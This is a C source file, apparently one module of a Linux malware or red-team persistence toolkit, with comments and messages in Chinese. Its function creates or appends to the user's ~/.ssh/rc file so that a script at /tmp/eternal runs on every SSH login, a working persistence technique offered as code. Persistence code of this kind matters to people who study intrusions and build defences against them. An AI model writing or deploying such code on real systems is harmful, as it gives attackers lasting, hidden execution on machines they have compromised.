#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_sshrc.h"

#ifdef SSHRC_MOD
void setup_user_sshrc_persistence() {
    printf("设置用户SSH RC持久化...\n");
    const char* home_path = getenv("HOME");
    if (home_path) {
        char user_ssh_rc_path[512];
        snprintf(user_ssh_rc_path, sizeof(user_ssh_rc_path), "%s/.ssh/rc", home_path);

        // 阶段 1: 检查文件存在性和写入权限
        if (access(user_ssh_rc_path, F_OK) != 0) {
            // 文件不存在，尝试创建文件
            FILE *new_file = fopen(user_ssh_rc_path, "w");
            if (new_file) {
                fclose(new_file);  // 创建后立即关闭，用于权限检查阶段的写入测试
                printf("用户SSH RC文件已创建。\n");
            } else {
                perror("无法创建用户的SSH RC文件");
                return;
            }
        }

        if (access(user_ssh_rc_path, W_OK) != 0) {
            perror("没有写权限到用户的SSH RC文件");
            return;
        }

        // 阶段 2: 执行写入操作
        FILE *user_ssh_rc_file = fopen(user_ssh_rc_path, "a");
        if (user_ssh_rc_file) {
            fprintf(user_ssh_rc_file, "\n/tmp/eternal\n");  // 假设/tmp/eternal是你想要持久化执行的脚本
            fclose(user_ssh_rc_file);
            printf("持久化命令已添加到用户SSH RC。\n");
        } else {
            perror("无法打开用户的SSH RC文件进行写入");
        }
    } else {
        printf("无法获取HOME环境变量。\n");
    }
}
#endif
